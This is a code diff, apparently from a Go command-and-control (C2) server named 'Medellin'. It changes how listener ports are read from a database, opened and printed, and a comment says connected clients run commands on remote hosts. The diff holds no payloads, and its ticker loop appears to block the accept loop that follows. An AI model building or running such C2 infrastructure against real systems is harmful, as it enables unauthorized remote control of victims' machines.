@@ -152,22 +152,19 @@ func server() {
 		log.Fatalln(err)
 	}
 	defer listener.Close()
-
+	printCurrentListerPorts() //Print open listeners on startup of the C2 server
 	//time.Sleep((2 * time.Second))
 	for range time.Tick(time.Second * 10) {
-		go checkListenerPorts()
+		checkListenerPorts()
 	}
 
 	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
-	//checkListenerPorts() //FIX THIS, ITS LOCATION AND THE FUNCTION'S CODE ITSELF AREN'T UP TO SNUFF
 	for {
-		//go checkListenerPorts()
 		con, err := listener.Accept()
 		if err != nil {
 			log.Println(err)
 			continue
 		}
-		//go checkListenerPorts()
 		go handleClientRequest(con)
 	}
 }
@@ -194,17 +191,19 @@ func checkListenerPorts() {
 	s := data.GetListenerPorts() //string that contains every port
 	v := strings.SplitN(s, ",", len(s))
 	//fmt.Print(v)
-	print("current listeners running on ports: ")
-	for i := 0; i < len(v); i++ {
-		//time.Sleep((2 * time.Second))
-		print(v[i] + " ")
+	//print("current listeners running on ports: ")
 
-		listener, err := net.Listen("tcp", "0.0.0.0:0") //start TCP server on 8000
+	for i := 0; i < len(v); i++ {
+		/*
+			Implement logic to create a listener on a port if its in the database
+		*/
+		listener2, err := net.Listen("tcp", "0.0.0.0:"+v[i]) //create listener on v[i] (index of the array storing the listener ports)
 		if err != nil {
-			log.Fatalln(err)
+			//log.Fatalln(err)
+			continue
 		}
-		//defer listener.Close()
-		go openPorts(listener) //allows for multiple connections over the same port
+
+		go openPorts(listener2)
 	}
 
 }
@@ -218,6 +217,17 @@ func openPorts(listener net.Listener) {
 		}
 		//time.Sleep(time.Second)
 		go handleClientRequest(con) //without this, a 2nd connection on the same port can connect but CANNOT run commands on the remote host, hence the go in the beginning
-		defer listener.Close()
+		defer listener.Close()      //close the listener when the application closes
 	}
+}
+
+func printCurrentListerPorts() {
+	s := data.GetListenerPorts() //string that contains every port
+	v := strings.SplitN(s, ",", len(s))
+
+	print("Current Listeners Running On Ports: ")
+	for i := 0; i < len(v); i++ {
+		print(v[i] + " ")
+	}
+	print("\n")
 }
